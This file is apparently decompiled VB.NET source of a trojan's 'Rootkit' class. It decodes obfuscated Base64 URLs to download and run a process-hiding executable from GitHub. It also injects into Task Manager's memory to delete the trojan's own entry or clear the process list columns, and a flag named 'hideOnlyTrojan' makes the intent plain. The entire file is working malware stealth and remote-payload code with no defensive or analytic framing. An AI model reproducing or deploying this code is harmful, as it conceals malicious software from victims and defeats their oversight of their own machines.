﻿Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Net
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Threading

Namespace Complex
	' Token: 0x02000015 RID: 21
	Friend Class Rootkit
		' Token: 0x06000074 RID: 116 RVA: 0x00009AC4 File Offset: 0x00007CC4
		Public Shared Function DownloadTool() As String
			If IntPtr.Size = 8 Then
				Program.toolLocation = Rootkit.DownloadFile(New Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")))
			Else
				Program.toolLocation = Rootkit.DownloadFile(New Uri(Program.Base64Decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")))
			End If
			Return Program.toolLocation
		End Function

		' Token: 0x06000075 RID: 117 RVA: 0x00009B24 File Offset: 0x00007D24
		Public Shared Function DownloadFile(Url As Uri) As String
			Try
				Dim path As String = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"
				Dim webClient As WebClient = New WebClient()
				webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path))
				Return Path.Combine(Path.GetTempPath(), path)
			Catch
			End Try
			Return String.Empty
		End Function

		' Token: 0x06000076 RID: 118 RVA: 0x00009BA0 File Offset: 0x00007DA0
		Public Shared Function IsProcessOpen(name As String) As Process
			For Each process As Process In Process.GetProcesses()
				If process.ProcessName.Contains(name) Then
					Return process
				End If
			Next
			Return Nothing
		End Function

		' Token: 0x06000077 RID: 119 RVA: 0x00009BEC File Offset: 0x00007DEC
		Public Shared Sub WaitForProcess(processesToCheck As String())
			Dim text As String = Rootkit.DownloadTool()
			If String.IsNullOrEmpty(text) Then
				Return
			End If
			While True
				For Each name As String In processesToCheck
					Dim process As Process = Rootkit.IsProcessOpen(name)
					If process IsNot Nothing Then
						Dim str As String = process.Id.ToString()
						Program.ProcessCommand(text, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName))
						Program.ProcessCommand(text, str + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName) + " *32")
					End If
				Next
				Thread.Sleep(200)
			End While
		End Sub

		' Token: 0x06000078 RID: 120
		Private Declare Function OpenProcess Lib "kernel32.dll" (dwDesiredAccess As Integer, bInheritHandle As Boolean, dwProcessId As UInteger) As IntPtr

		' Token: 0x06000079 RID: 121
		Private Declare Function VirtualAllocEx Lib "kernel32.dll" (hProcess As IntPtr, lpAddress As IntPtr, dwSize As UInteger, flAllocationType As Integer, flProtect As Integer) As IntPtr

		' Token: 0x0600007A RID: 122
		Private Declare Function VirtualFreeEx Lib "kernel32.dll" (hProcess As IntPtr, lpAddress As IntPtr, dwSize As UInteger, dwFreeType As Integer) As Boolean

		' Token: 0x0600007B RID: 123
		Private Declare Function CloseHandle Lib "kernel32.dll" (hObject As IntPtr) As <MarshalAs(UnmanagedType.Bool)> Boolean

		' Token: 0x0600007C RID: 124
		Private Declare Function WriteProcessMemory Lib "kernel32.dll" (hProcess As IntPtr, lpBaseAddress As IntPtr, lpBuffer As Byte(), nSize As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef lpNumberOfBytesWritten As UIntPtr) As Boolean

		' Token: 0x0600007D RID: 125
		Private Declare Function ReadProcessMemory Lib "kernel32.dll" (hProcess As IntPtr, lpBaseAddress As IntPtr, <Out()> lpBuffer As Byte(), dwSize As Integer, <System.Runtime.InteropServices.OutAttribute()> ByRef lpNumberOfBytesRead As UIntPtr) As Boolean

		' Token: 0x0600007E RID: 126
		Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (hWnd As IntPtr, <System.Runtime.InteropServices.OutAttribute()> ByRef lpdwProcessId As UInteger) As UInteger

		' Token: 0x0600007F RID: 127
		Private Declare Auto Function SendMessage Lib "user32.dll" (hWnd As IntPtr, Msg As UInteger, wParam As IntPtr, lParam As IntPtr) As IntPtr

		' Token: 0x06000080 RID: 128
		Private Declare Function FindWindow Lib "user32.dll" (lpClassName As String, lpWindowName As String) As IntPtr

		' Token: 0x06000081 RID: 129
		Private Declare Function FindWindowEx Lib "user32.dll" (parentHandle As IntPtr, childAfter As IntPtr, className As String, windowTitle As String) As IntPtr

		' Token: 0x06000082 RID: 130 RVA: 0x00009CCC File Offset: 0x00007ECC
		Private Shared Function StructureToByteArray(obj As Object) As Byte()
			Dim num As Integer = Marshal.SizeOf(obj)
			Dim array As Byte() = New Byte(num - 1) {}
			Dim intPtr As IntPtr = Marshal.AllocHGlobal(num)
			Marshal.StructureToPtr(obj, intPtr, True)
			Marshal.Copy(intPtr, array, 0, num)
			Marshal.FreeHGlobal(intPtr)
			Return array
		End Function

		' Token: 0x06000083 RID: 131 RVA: 0x00009D10 File Offset: 0x00007F10
		Private Shared Function OpenProcessHandle(pid As UInteger) As IntPtr
			Return Rootkit.OpenProcess(56, False, pid)
		End Function

		' Token: 0x06000084 RID: 132 RVA: 0x00009D2B File Offset: 0x00007F2B
		Private Shared Sub CloseProcessHandle(hProcess As IntPtr)
			Rootkit.CloseHandle(hProcess)
		End Sub

		' Token: 0x06000085 RID: 133 RVA: 0x00009D38 File Offset: 0x00007F38
		Private Shared Function AllocExternalMemory(memSize As UInteger, hProcess As IntPtr) As IntPtr
			Return Rootkit.VirtualAllocEx(hProcess, IntPtr.Zero, memSize, 12288, 4)
		End Function

		' Token: 0x06000086 RID: 134 RVA: 0x00009D5C File Offset: 0x00007F5C
		Private Shared Sub FreeExternalMemory(hProcess As IntPtr, MemAddress As IntPtr, memSize As UInteger)
			Rootkit.VirtualFreeEx(hProcess, MemAddress, memSize, 32768)
		End Sub

		' Token: 0x06000087 RID: 135 RVA: 0x00009D70 File Offset: 0x00007F70
		Private Shared Function FindTaskManager() As IntPtr
			Dim intPtr As IntPtr = Rootkit.FindWindow("TaskManagerWindow", "Administrador de tareas")
			If intPtr = IntPtr.Zero Then
				intPtr = Rootkit.FindWindow("#32770", "Task Manager")
				intPtr = Rootkit.FindWindowEx(intPtr, IntPtr.Zero, "#32770", Nothing)
				intPtr = Rootkit.FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes")
			Else
				intPtr = Rootkit.FindWindowEx(intPtr, IntPtr.Zero, "#32770", Nothing)
				intPtr = Rootkit.FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos")
			End If
			Return intPtr
		End Function

		' Token: 0x06000088 RID: 136 RVA: 0x00009E0C File Offset: 0x0000800C
		Private Shared Function GetItemCount(handle As IntPtr) As IntPtr
			Return Rootkit.SendMessage(handle, 4100UI, IntPtr.Zero, IntPtr.Zero)
		End Function

		' Token: 0x06000089 RID: 137 RVA: 0x00009E33 File Offset: 0x00008033
		Private Shared Sub DeleteItem(handle As IntPtr, index As IntPtr)
			Rootkit.SendMessage(handle, 4104UI, index, IntPtr.Zero)
		End Sub

		' Token: 0x0600008A RID: 138 RVA: 0x00009E48 File Offset: 0x00008048
		Private Shared Sub DeleteColumn(handle As IntPtr)
			Rootkit.SendMessage(handle, 4124UI, IntPtr.Zero, IntPtr.Zero)
		End Sub

		' Token: 0x0600008B RID: 139 RVA: 0x00009E64 File Offset: 0x00008064
		Private Shared Function GetItemText(handle As IntPtr, index As IntPtr) As String
			Dim array As Byte() = New Byte(49) {}
			Dim lvitem As Rootkit.LVITEM = Nothing
			Dim pid As UInteger
			Rootkit.GetWindowThreadProcessId(handle, pid)
			Dim hProcess As IntPtr = Rootkit.OpenProcessHandle(pid)
			Dim intPtr As IntPtr = Rootkit.AllocExternalMemory(CUInt(Marshal.SizeOf(Of Rootkit.LVITEM)(lvitem)), hProcess)
			Dim intPtr2 As IntPtr = Rootkit.AllocExternalMemory(50UI, hProcess)
			lvitem.iItem = index
			lvitem.iSubItem = CType(0, IntPtr)
			lvitem.cchTextMax = 50UI
			lvitem.pszText = intPtr2
			Dim uintPtr As UIntPtr
			Rootkit.WriteProcessMemory(hProcess, intPtr, Rootkit.StructureToByteArray(lvitem), CUInt(Marshal.SizeOf(Of Rootkit.LVITEM)(lvitem)), uintPtr)
			Rootkit.SendMessage(handle, 4141UI, index, intPtr)
			Rootkit.ReadProcessMemory(hProcess, intPtr2, array, 50, uintPtr)
			Rootkit.FreeExternalMemory(hProcess, intPtr, CUInt(Marshal.SizeOf(Of Rootkit.LVITEM)(lvitem)))
			Rootkit.FreeExternalMemory(hProcess, intPtr2, 50UI)
			Rootkit.CloseProcessHandle(hProcess)
			Return Encoding.ASCII.GetString(array)
		End Function

		' Token: 0x0600008C RID: 140 RVA: 0x00009F44 File Offset: 0x00008144
		Private Shared Sub HideProcess(process As String)
			Dim intPtr As IntPtr = Rootkit.FindTaskManager()
			If intPtr <> IntPtr.Zero Then
				Dim num As Integer = CInt(Rootkit.GetItemCount(intPtr))
				For i As Integer = 0 To num - 1
					Dim itemText As String = Rootkit.GetItemText(intPtr, CType(i, IntPtr))
					If itemText.Contains(process) Then
						Rootkit.DeleteItem(intPtr, CType(i, IntPtr))
					End If
				Next
			End If
		End Sub

		' Token: 0x0600008D RID: 141 RVA: 0x00009FBC File Offset: 0x000081BC
		Private Shared Sub HideAllProcesses()
			Dim intPtr As IntPtr = Rootkit.FindTaskManager()
			If intPtr <> IntPtr.Zero Then
				Rootkit.DeleteColumn(intPtr)
				Rootkit.DeleteColumn(intPtr)
				Rootkit.DeleteColumn(intPtr)
				Rootkit.DeleteColumn(intPtr)
				Rootkit.DeleteColumn(intPtr)
			End If
		End Sub

		' Token: 0x0600008E RID: 142 RVA: 0x0000A008 File Offset: 0x00008208
		Public Shared Sub Hide()
			Dim thread As Thread = AddressOf Rootkit.Worker
			thread.Start()
		End Sub

		' Token: 0x0600008F RID: 143 RVA: 0x0000A02F File Offset: 0x0000822F
		Public Shared Sub StopHiding()
			Rootkit.endWorker = True
		End Sub

		' Token: 0x06000090 RID: 144 RVA: 0x0000A03C File Offset: 0x0000823C
		Private Shared Sub Worker()
			While Not Rootkit.endWorker
				If Rootkit.hideOnlyTrojan Then
					Rootkit.HideProcess(Process.GetCurrentProcess().ProcessName + ".exe")
					Thread.Sleep(525)
				Else
					Rootkit.HideAllProcesses()
					Thread.Sleep(1000)
				End If
			End While
			Rootkit.endWorker = False
		End Sub

		' Token: 0x04000065 RID: 101
		Private Const PROCESS_VM_OPERATION As Integer = 8

		' Token: 0x04000066 RID: 102
		Private Const PROCESS_VM_READ As Integer = 16

		' Token: 0x04000067 RID: 103
		Private Const PROCESS_VM_WRITE As Integer = 32

		' Token: 0x04000068 RID: 104
		Private Const PROCESS_ALL_ACCESS As Integer = 0

		' Token: 0x04000069 RID: 105
		Private Const MEM_COMMIT As Integer = 4096

		' Token: 0x0400006A RID: 106
		Private Const MEM_RESERVE As Integer = 8192

		' Token: 0x0400006B RID: 107
		Private Const MEM_DECOMMIT As Integer = 16384

		' Token: 0x0400006C RID: 108
		Private Const MEM_RELEASE As Integer = 32768

		' Token: 0x0400006D RID: 109
		Private Const MEM_FREE As Integer = 65536

		' Token: 0x0400006E RID: 110
		Private Const MEM_PRIVATE As Integer = 131072

		' Token: 0x0400006F RID: 111
		Private Const MEM_MAPPED As Integer = 262144

		' Token: 0x04000070 RID: 112
		Private Const MEM_TOP_DOWN As Integer = 1048576

		' Token: 0x04000071 RID: 113
		Private Const PAGE_NOACCESS As Integer = 1

		' Token: 0x04000072 RID: 114
		Private Const PAGE_READONLY As Integer = 2

		' Token: 0x04000073 RID: 115
		Private Const PAGE_READWRITE As Integer = 4

		' Token: 0x04000074 RID: 116
		Private Const PAGE_WRITECOPY As Integer = 8

		' Token: 0x04000075 RID: 117
		Private Const PAGE_EXECUTE As Integer = 16

		' Token: 0x04000076 RID: 118
		Private Const PAGE_EXECUTE_READ As Integer = 32

		' Token: 0x04000077 RID: 119
		Private Const PAGE_EXECUTE_READWRITE As Integer = 64

		' Token: 0x04000078 RID: 120
		Private Const PAGE_EXECUTE_WRITECOPY As Integer = 128

		' Token: 0x04000079 RID: 121
		Private Const PAGE_GUARD As Integer = 256

		' Token: 0x0400007A RID: 122
		Private Const PAGE_NOCACHE As Integer = 512

		' Token: 0x0400007B RID: 123
		Private Const LVM_FIRST As Integer = 4096

		' Token: 0x0400007C RID: 124
		Private Const LVM_GETITEMCOUNT As Integer = 4100

		' Token: 0x0400007D RID: 125
		Private Const LVM_DELETEITEM As Integer = 4104

		' Token: 0x0400007E RID: 126
		Private Const LVM_GETITEMTEXTA As Integer = 4141

		' Token: 0x0400007F RID: 127
		Private Const LVM_SETITEMTEXTA As Integer = 4142

		' Token: 0x04000080 RID: 128
		Private Const LVM_DELETECOLUMN As Integer = 4124

		' Token: 0x04000081 RID: 129
		Private Shared endWorker As Boolean = False

		' Token: 0x04000082 RID: 130
		Public Shared hideOnlyTrojan As Boolean = True

		' Token: 0x02000016 RID: 22
		Private Structure LVITEM
			' Token: 0x04000083 RID: 131
			Public mask As UInteger

			' Token: 0x04000084 RID: 132
			Public iItem As IntPtr

			' Token: 0x04000085 RID: 133
			Public iSubItem As IntPtr

			' Token: 0x04000086 RID: 134
			Public state As UInteger

			' Token: 0x04000087 RID: 135
			Public stateMask As UInteger

			' Token: 0x04000088 RID: 136
			Public pszText As IntPtr

			' Token: 0x04000089 RID: 137
			Public cchTextMax As UInteger

			' Token: 0x0400008A RID: 138
			Public iImage As Integer

			' Token: 0x0400008B RID: 139
			Public lParam As IntPtr
		End Structure
	End Class
End Namespace
